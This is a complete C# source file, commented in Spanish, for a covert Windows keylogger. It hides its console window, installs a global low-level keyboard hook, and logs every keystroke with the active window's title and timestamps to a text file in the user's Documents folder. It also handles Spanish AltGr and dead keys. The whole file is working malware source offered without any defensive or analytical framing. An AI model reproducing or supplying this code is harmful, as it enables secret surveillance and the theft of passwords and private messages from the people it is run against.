using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

class KeyLogger
{
    const int WH_KEYBOARD_LL = 13;
    const int WM_KEYDOWN     = 0x0100;

    static LowLevelKeyboardProc _proc = HookCallback;
    static IntPtr _hook;
    static StreamWriter log;
    static string lastWindow = "";

    [STAThread]
    static void Main()
    {
        ShowWindow(GetConsoleWindow(), 0);

        string logPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            "log.txt");
        log = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write))
        { AutoFlush = true };

        _hook = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hook);
        log.Close();
    }

    /* --------------------  LOW-LEVEL HOOK  -------------------- */

    static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using var p  = Process.GetCurrentProcess();
        using var m  = p.MainModule;
        return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
            GetModuleHandle(m.ModuleName), 0);
    }

    delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vk = Marshal.ReadInt32(lParam);

            /* --- Ventana activa --- */
            var sb = new StringBuilder(256);
            GetWindowText(GetForegroundWindow(), sb, sb.Capacity);
            string win = sb.ToString();
            if (win != lastWindow)
            {
                lastWindow = win;
                log.WriteLine();
                log.WriteLine($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Ventana: {win}");
            }

            /* --- Estado de teclas para ToUnicodeEx --- */
            byte[] ks = new byte[256];
            GetKeyboardState(ks);

            if ((GetKeyState(VK_SHIFT) & 0x8000) != 0) ks[VK_SHIFT] = 0x80;
            if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) ks[VK_CAPITAL] = 0x01;
            bool altGr = (GetKeyState(VK_RMENU) & 0x8000) != 0;
            if (altGr)
            {
                ks[VK_RMENU]  = ks[VK_MENU] = ks[VK_CONTROL] = 0x80;
            }

            var buf = new StringBuilder(5);
            int r   = ToUnicodeEx((uint)vk, 0, ks, buf, buf.Capacity, 0, GetKeyboardLayout(0));
            string raw = buf.ToString();
            string key = Translate(vk, raw, altGr);
            log.Write(key);
        }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }

    /* --------------------  TRADUCCIÓN -------------------- */

    static string Translate(int vk, string raw, bool altGr)
    {
        /* 1) Si ToUnicodeEx devolvió un carácter imprimible correcto */
        if (!string.IsNullOrEmpty(raw) &&
            !char.IsControl(raw[0])     &&
            (int)raw[0] != 0xFFFF)
        {
            /* Normalizamos mayús/minús si corresponde */
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            if (char.IsLetter(raw[0]) && !shift && !caps && char.IsUpper(raw[0]))
                return raw.ToLower();
            return raw;
        }

        /* 2) Dead keys y AltGr */
        if (altGr)
        {
            return vk switch
            {
                49  => "¬", // AltGr+1
                50  => "@", // AltGr+2
                51  => "#", // AltGr+3
                52  => "~", // AltGr+4
                54  => "|", // AltGr+6
                69  => "€", // AltGr+E
                55  => "{", // AltGr+7
                56  => "[", // AltGr+8
                57  => "]", // AltGr+9
                48  => "}", // AltGr+0
                226 => "\\",// AltGr+º (Oem102)
                _   => MapOem(vk)
            };
        }

        /* 3) Dead keys sueltos */
        return vk switch
        {
            192 => "^",
            222 => "´",
            170 => "¨",
            _   => MapOem(vk)
        };
    }

    static string MapOem(int vk) => vk switch
    {
        160 or 161 => "[SHIFT]",
        162 or 163 => "[CTRL]",
        164        => "[ALT]",
        165        => "[ALTGR]",
        13         => "[ENTER]\n",
        9          => "[TAB]",
        27         => "[ESC]",
        8          => "[BACKSPACE]",
        32         => "[SPACE]",
        186        => "ñ",
        187        => "=",
        189        => "-",
        188        => ",",
        190        => ".",
        191        => "?",
        44         => "[PrintScreen]",
        _          => $"[UNK-{vk}]"
    };

    /* --------------------  P/Invoke y constantes -------------------- */

    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(
        int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(
        IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]   static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]   static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMax);
    [DllImport("user32.dll")]   static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")]   static extern short GetKeyState(int nVirtKey);
    [DllImport("user32.dll")]   static extern IntPtr GetKeyboardLayout(uint idThread);
    [DllImport("user32.dll")]   static extern int ToUnicodeEx(
        uint wVk, uint wScan, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff, uint wFlags, IntPtr dwhkl);

    const int VK_SHIFT   = 0x10;
    const int VK_CAPITAL = 0x14;
    const int VK_MENU    = 0x12; // Alt
    const int VK_CONTROL = 0x11;
    const int VK_RMENU   = 0xA5; // Right-Alt (AltGr)
}
